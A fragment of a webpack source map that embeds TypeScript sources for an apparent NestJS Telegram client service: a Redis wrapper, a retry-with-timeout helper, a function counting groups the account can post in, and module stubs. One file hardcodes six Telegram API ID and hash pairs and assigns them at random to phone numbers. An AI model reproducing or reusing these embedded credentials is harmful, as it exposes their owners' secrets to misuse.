return axios.isAxiosError(error);\r\n}\r\n\r\n/**\r\n * Creates error objects with consistent format\r\n * @param message - Error message\r\n * @param status - HTTP status code\r\n * @param errorType - Error type\r\n * @returns Standardized error response\r\n */\r\nexport function createError(message: string, status = 500, errorType = 'ApplicationError'): ErrorResponse {\r\n  return {\r\n    status,\r\n    message,\r\n    error: errorType\r\n  };\r\n}\r\n\r\n/**\r\n * Error handling utilities for HTTP requests and responses\r\n */\r\nexport const ErrorUtils = {\r\n  parseError,\r\n  extractMessage,\r\n  sendNotification,\r\n  createError,\r\n  isAxiosError\r\n};","export function getReadableTimeDifference(ms1: number, ms2: number= Date.now()): string {\n  const diff = Math.abs(ms1 - ms2); // get absolute difference\n  const seconds = Math.floor(diff / 1000);\n  \n  const days = Math.floor(seconds / (3600 * 24));\n  const hours = Math.floor((seconds % (3600 * 24)) / 3600);\n  const minutes = Math.floor((seconds % 3600) / 60);\n  const secs = seconds % 60;\n\n  let result = [];\n  if (days > 0) result.push(`${days}d`);\n  if (hours > 0) result.push(`${hours}h`);\n  if (minutes > 0) result.push(`${minutes}m`);\n  if (secs > 0 || result.length === 0) result.push(`${secs}s`);\n\n  return result.join(\" \");\n}\n","import Redis from \"ioredis\";\nimport { Logger } from \"./logger\";\n\nconst logger = new Logger(__filename);\n\n/**\n * Configuration options for Redis connection.\n */\ninterface RedisConfig {\n    host: string;\n    port: number;\n    password?: string;\n    db: number;\n    retryStrategy?: (times: number) => number | null;\n}\n\n/**\n * Singleton Redis client with strong typing and extended utility methods.\n */\nexport class RedisClient {\n    private static instance: Redis | null = null;\n\n    private constructor() {\n        // Private constructor to enforce singleton pattern\n    }\n\n    /**\n     * Gets the singleton Redis client instance.\n     * @returns Redis client instance.\n     * @throws Error if connection cannot be established.\n     */\n    static getClient(): Redis {\n        if (!RedisClient.instance) {\n            const isRemote = process.env.REDIS_MODE === \"remote\";\n            const config: RedisConfig = {\n                host: process.env.REDIS_HOST || (isRemote ? \"0.0.0.0\" : \"127.0.0.1\"),\n                port: Number(process.env.REDIS_PORT) || 6379,\n                password: process.env.REDIS_PASSWORD?.trim() || undefined,\n                db: Number(process.env.REDIS_DB) || 0,\n                retryStrategy: (times: number) => {\n                    const delay = Math.min(times * 100, 3000); // Exponential backoff, max 3s\n                    logger.warn(`Retrying Redis connection (${times}) after ${delay}ms`);\n                    return delay;\n                },\n            };\n\n            try {\n                RedisClient.instance = new Redis(config);\n\n                RedisClient.instance.on(\"connect\", () => {\n                    logger.log(`Connected to Redis at ${config.host}:${config.port}, DB: ${config.db}`);\n                });\n\n                RedisClient.instance.on(\"error\", (err) => {\n                    logger.error(\"Redis connection error:\", err.message);\n                });\n\n                RedisClient.instance.on(\"close\", () => {\n                    logger.log(\"Redis connection closed\");\n                });\n            } catch (error: any) {\n                logger.error(\"Failed to initialize Redis client:\", error);\n                throw new Error(`Redis initialization failed: ${error.message}`);\n            }\n        }\n\n        return RedisClient.instance;\n    }\n\n    /**\n     * Gracefully disconnects the Redis client.\n     */\n    static async disconnect(): Promise<void> {\n        if (RedisClient.instance) {\n            try {\n                await RedisClient.instance.quit();\n                logger.log(\"Redis client disconnected successfully\");\n            } catch (error) {\n                logger.error(\"Error during Redis disconnection:\", error);\n            } finally {\n                RedisClient.instance = null;\n            }\n        }\n    }\n\n    // -------------------- STRING / OBJECT --------------------\n\n    /**\n     * Sets a key-value pair with an optional expiration time.\n     */\n    static async set<T extends object | string | number>(\n        key: string,\n        value: T,\n        ttl?: number\n    ): Promise<\"OK\"> {\n        const client = RedisClient.getClient();\n        try {\n            const finalValue =\n                typeof value === \"string\" || typeof value === \"number\"\n                    ? String(value)\n                    : JSON.stringify(value);\n\n            if (ttl) {\n                return await client.set(key, finalValue, \"EX\", ttl);\n            }\n            return await client.set(key, finalValue);\n        } catch (error) {\n            logger.error(`Error setting key ${key}:`, error);\n            throw error;\n        }\n    }\n\n    /**\n     * Gets a value by key (raw string).\n     */\n    static async get(key: string): Promise<string | null> {\n        const client = RedisClient.getClient();\n        try {\n            return await client.get(key);\n        } catch (error) {\n            logger.error(`Error getting key ${key}:`, error);\n            throw error;\n        }\n    }\n\n    /**\n     * Gets and parses a JSON value by key.\n     */\n    static async getObject<T>(key: string): Promise<T | null> {\n        const value = await RedisClient.get(key);\n        if (!value) return null;\n        try {\n            return JSON.parse(value) as T;\n        } catch {\n            logger.warn(`Failed to parse JSON for key ${key}`);\n            return null;\n        }\n    }\n\n    // -------------------- NUMERIC HELPERS --------------------\n\n    /**\n     * Increments a numeric value by step (default 1).\n     */\n    static async incr(key: string, step = 1): Promise<number> {\n        const client = RedisClient.getClient();\n        try {\n            return step === 1\n                ? await client.incr(key)\n                : await client.incrby(key, step);\n        } catch (error) {\n            logger.error(`Error incrementing key ${key}:`, error);\n            throw error;\n        }\n    }\n\n    /**\n     * Decrements a numeric value by step (default 1).\n     */\n    static async decr(key: string, step = 1): Promise<number> {\n        const client = RedisClient.getClient();\n        try {\n            return step === 1\n                ? await client.decr(key)\n                : await client.decrby(key, step);\n        } catch (error) {\n            logger.error(`Error decrementing key ${key}:`, error);\n            throw error;\n        }\n    }\n\n    // -------------------- LISTS --------------------\n\n    static async rpush(key: string, values: string | string[]): Promise<number> {\n        const client = RedisClient.getClient();\n        try {\n            return Array.isArray(values)\n                ? await client.rpush(key, ...values)\n                : await client.rpush(key, values);\n        } catch (error) {\n            logger.error(`Error pushing to list ${key}:`, error);\n            throw error;\n        }\n    }\n\n    static async lrange(\n        key: string,\n        start: number,\n        end: number\n    ): Promise<string[]> {\n        const client = RedisClient.getClient();\n        return client.lrange(key, start, end);\n    }\n\n    // -------------------- HASHES --------------------\n\n    static async hset(\n        key: string,\n        field: string,\n        value: string | number | object\n    ): Promise<number> {\n        const client = RedisClient.getClient();\n        const val =\n            typeof value === \"string\" || typeof value === \"number\"\n                ? String(value)\n                : JSON.stringify(value);\n        return client.hset(key, field, val);\n    }\n\n    static async hget(key: string, field: string): Promise<string | null> {\n        return RedisClient.getClient().hget(key, field);\n    }\n\n    static async hgetObject<T>(\n        key: string,\n        field: string\n    ): Promise<T | null> {\n        const val = await RedisClient.hget(key, field);\n        if (!val) return null;\n        try {\n            return JSON.parse(val) as T;\n        } catch {\n            return null;\n        }\n    }\n\n    static async hgetall(\n        key: string\n    ): Promise<Record<string, string>> {\n        return RedisClient.getClient().hgetall(key);\n    }\n\n    // -------------------- SETS --------------------\n\n    static async sadd(key: string, members: string | string[]): Promise<number> {\n        return Array.isArray(members)\n            ? RedisClient.getClient().sadd(key, ...members)\n            : RedisClient.getClient().sadd(key, members);\n    }\n\n    static async smembers(key: string): Promise<string[]> {\n        return RedisClient.getClient().smembers(key);\n    }\n\n    // -------------------- KEYS / TTL --------------------\n\n    static async del(keys: string | string[]): Promise<number> {\n        return Array.isArray(keys)\n            ? RedisClient.getClient().del(...keys)\n            : RedisClient.getClient().del(keys);\n    }\n\n    static async exists(key: string): Promise<boolean> {\n        return (await RedisClient.getClient().exists(key)) === 1;\n    }\n\n    static async expire(key: string, seconds: number): Promise<number> {\n        return RedisClient.getClient().expire(key, seconds);\n    }\n\n    static async ttl(key: string): Promise<number> {\n        return RedisClient.getClient().ttl(key);\n    }\n}","import { Api, TelegramClient } from \"telegram\";\nimport { parseError } from \"../parseError\";\n\nexport async function channelInfo(client: TelegramClient, sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {\n    if (!client) throw new Error('Client is not initialized');\n\n    let canSendTrueCount = 0;\n    let canSendFalseCount = 0;\n    let totalCount = 0;\n    let channelArray: string[] = [];\n    const canSendFalseChats = [];\n\n    // Use iterDialogs instead of getDialogs for better performance with large dialog lists\n    for await (const dialog of client.iterDialogs({ limit: 1500 })) {\n        if (dialog.isChannel || dialog.isGroup) {\n            try {\n                const chatEntity = <Api.Channel>dialog.entity.toJSON();\n                const { broadcast, defaultBannedRights, id } = chatEntity;\n                totalCount++;\n\n                if (!broadcast && !defaultBannedRights?.sendMessages) {\n                    canSendTrueCount++;\n                    channelArray.push(id.toString()?.replace(/^-100/, \"\"));\n                } else {\n                    canSendFalseCount++;\n                    canSendFalseChats.push(id.toString()?.replace(/^-100/, \"\"));\n                }\n            } catch (error) {\n                parseError(error, \"Failed to Fetch Channel Info\");\n            }\n        }\n    }\n\n    console.info(\"TotalChats:\", totalCount);\n\n    return {\n        chatsArrayLength: totalCount,\n        canSendTrueCount,\n        canSendFalseCount,\n        ids: sendIds ? channelArray : [],\n        canSendFalseChats\n    };\n}","export * from './channelinfo'","import { RedisClient } from \"./redisClient\";\nimport { Logger } from \"./logger\";\n\nconst logger = new Logger(__filename);\nexport interface ITelegramCredentials {\n  apiId: number;\n  apiHash: string;\n}\n\nconst API_CREDENTIALS: ITelegramCredentials[] = [\n  { apiId: 27919939, apiHash: \"5ed3834e741b57a560076a1d38d2fa94\" },\n  { apiId: 25328268, apiHash: \"b4e654dd2a051930d0a30bb2add80d09\" },\n  { apiId: 12777557, apiHash: \"05054fc7885dcfa18eb7432865ea3500\" },\n  { apiId: 27565391, apiHash: \"a3a0a2e895f893e2067dae111b20f2d9\" },\n  { apiId: 27586636, apiHash: \"f020539b6bb5b945186d39b3ff1dd998\" },\n  { apiId: 29210552, apiHash: \"f3dbae7e628b312c829e1bd341f1e9a9\" }\n];\n\n/**\n * Picks a random set of credentials.\n */\nfunction pickRandomCredentials(): ITelegramCredentials {\n  return API_CREDENTIALS[Math.floor(Math.random() * API_CREDENTIALS.length)];\n}\n\n/**\n * Gets credentials for a mobile, reusing cached ones if present.\n *\n * @param mobile - Unique identifier (e.g., phone number).\n */\nexport async function getCredentialsForMobile(\n  mobile: string,\n  ttl: number = 24 * 60 * 60 * 60\n): Promise<ITelegramCredentials> {\n  const redisKey = `tg:credentials:${mobile}`;\n  // Try cache first\n  const cached = await RedisClient.getObject<ITelegramCredentials>(redisKey);\n  if (cached) {\n    return cached;\n  }\n  const creds = pickRandomCredentials();\n  logger.log(`[getCredentialsForMobile] Storing credentials in Redis for ${mobile}`);\n  await RedisClient.set(redisKey, creds, ttl);\n\n  return creds;\n}\n","import { sleep } from \"telegram/Helpers\";\n\ntype ShouldRetry = (error: any, attempt: number) => boolean;\n\ninterface WithTimeoutOptions {\n  timeout?: number; // per-attempt timeout\n  errorMessage?: string;\n  throwErr?: boolean;\n  maxRetries?: number;\n  baseDelay?: number;\n  maxDelay?: number;\n  shouldRetry?: ShouldRetry;\n  cancelSignal?: AbortSignal;\n  onTimeout?: (error: any, attempts: number) => Promise<void>;\n}\n\nexport async function withTimeout<T>(\n  promiseFactory: () => Promise<T>,\n  options: WithTimeoutOptions = {}\n): Promise<T> {\n  const {\n    timeout = 60000,\n    errorMessage = \"Operation timeout\",\n    throwErr = true,\n    maxRetries = 1,\n    baseDelay = 500,\n    maxDelay = 5000,\n    shouldRetry = defaultShouldRetry,\n    cancelSignal,\n    onTimeout,\n  } = options;\n\n  let lastError: any;\n\n  for (let attempt = 1; attempt <= maxRetries; attempt++) {\n    if (cancelSignal?.aborted) {\n      lastError = new Error(\"Operation cancelled\");\n      break;\n    }\n\n    try {\n      const task = promiseFactory();\n      return await runWithTimeout(task, timeout, cancelSignal, errorMessage);\n    } catch (err) {\n      lastError = err;\n      if (!shouldRetry(err, attempt) || attempt === maxRetries) break;\n\n      const delay = Math.min(\n        baseDelay * 2 ** (attempt - 1) * (1 + Math.random() * 0.1),\n        maxDelay\n      );\n      await sleep(delay);\n    }\n  }\n\n  if (onTimeout) {\n    try {\n      await onTimeout(lastError, maxRetries);\n    } catch (cbErr) {\n      console.error(\"onTimeout callback failed:\", cbErr);\n    }\n  }\n\n  return throwErr ? Promise.reject(lastError) : undefined;\n}\n\nasync function runWithTimeout<T>(\n  promise: Promise<T>,\n  timeoutMs: number,\n  cancelSignal?: AbortSignal,\n  errorMessage?: string\n): Promise<T> {\n  let timeoutId: NodeJS.Timeout | null = null;\n  let abortListener: (() => void) | null = null;\n  const start = Date.now();\n\n  try {\n    return await new Promise<T>((resolve, reject) => {\n      timeoutId = setTimeout(() => {\n        const elapsed = Date.now() - start;\n        reject(new Error(`${errorMessage ?? \"Timeout\"}\\nElapsed: ${elapsed}ms`));\n      }, timeoutMs);\n\n      if (cancelSignal) {\n        if (cancelSignal.aborted) {\n          const elapsed = Date.now() - start;\n          reject(new Error(`Operation cancelled\\nElapsed: ${elapsed}ms`));\n          return;\n        }\n        abortListener = () => {\n          const elapsed = Date.now() - start;\n          reject(new Error(`Operation cancelled\\nElapsed: ${elapsed}ms`));\n        };\n        cancelSignal.addEventListener(\"abort\", abortListener, { once: true });\n      }\n\n      promise.then(resolve).catch(reject);\n    });\n  } finally {\n    if (timeoutId) {\n      clearTimeout(timeoutId);\n      timeoutId = null;\n    }\n    if (abortListener && cancelSignal) {\n      cancelSignal.removeEventListener(\"abort\", abortListener);\n      abortListener = null;\n    }\n  }\n}\n\nfunction defaultShouldRetry(error: any, attempt: number): boolean {\n  if (attempt >= 3) return false;\n  if (error?.message?.toLowerCase().includes(\"cancelled\")) return false;\n  const msg = (error?.message || \"\").toLowerCase();\n  const code = error?.code;\n  return (\n    msg.includes(\"timeout\") ||\n    msg.includes(\"network\") ||\n    msg.includes(\"connection\") ||\n    code === \"ECONNRESET\" ||\n    code === \"ENOTFOUND\" ||\n    code === \"ETIMEDOUT\"\n  );\n}\n","module.exports = require(\"@nestjs/common\");","module.exports = require(\"@nestjs/config\");","module.exports = require(\"@nestjs/core\");","module.exports = require(\"@nestjs/mapped-types\");","module.exports = require(\"@nestjs/mongoose\");","module.exports = require(\"@nestjs/platform-express\");","module.exports = require(\"@nestjs/swagger\");","module.exports = require(\"adm-zip\");","module.exports = require(\"axios\");","module.exports = require(\"big-integer\");","module.exports = require(\"chalk\");","module.exports = require(\"class-transformer\");","module.exports = require(\"class-validator\");","module.exports = require(\"cloudinary\");","module.exports = require(\"form-data\");","module.exports = require(\"https\");","module.exports = require(\"imap\");","module.exports = require(\"ioredis\");","module.exports = require(\"lodash\");","module.exports = require(\"mongoose\");","module.exports = require(\"multer\");","module.exports = require(\"node-cache\");","module.exports = require(\"reflect-metadata\");","module.exports = require(\"rxjs\");","module.exports = require(\"rxjs/operators\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/Helpers\");","module.exports = require(\"telegram/Password\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events\");","module.exports = require(\"telegram/extensions/Logger\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"telegram/tl\");","module.exports = require(\"crypto\");","module.exports = require(\"fs\");","module.exports = require(\"path\");","module.exports = require(\"url\");","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Check if module exists (development only)\n\tif (__webpack_modules__[moduleId] === undefined) {\n\t\tvar e = new Error(\"Cannot find module '\" + moduleId + \"'\");\n\t\te.code = 'MODULE_NOT_FOUND';\n\t\tthrow e;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","","// startup\n// Load entry module and return exports\n// This entry module is referenced by other modules so it can't be inlined\nvar __webpack_exports__ = __webpack_require__(\"./src/main.ts\");\n",""],"names":[],"sourceRoot":""}